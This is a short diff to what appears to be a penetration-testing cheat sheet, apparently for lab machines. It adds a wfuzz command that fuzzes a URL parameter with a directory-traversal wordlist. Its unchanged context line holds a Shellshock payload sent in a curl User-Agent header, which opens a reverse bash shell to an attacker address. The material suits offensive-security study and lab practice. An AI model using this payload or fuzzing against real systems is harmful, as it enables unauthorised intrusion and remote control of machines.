@@ -3,6 +3,12 @@
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.199/443 0>&1' http://10.11.1.71/cgi-bin/admin.cgi
 ```
 
+## Wfuzz commands
+### url parameter
+```
+wfuzz -w /usr/share/wordlists/wfuzz/vulns/dirTraversal-nix.txt --hs 'Page not found' http://10.10.10.151/blog/?lang=FUZZ
+```
+
 ## Database
 ### Sqlite
 ```
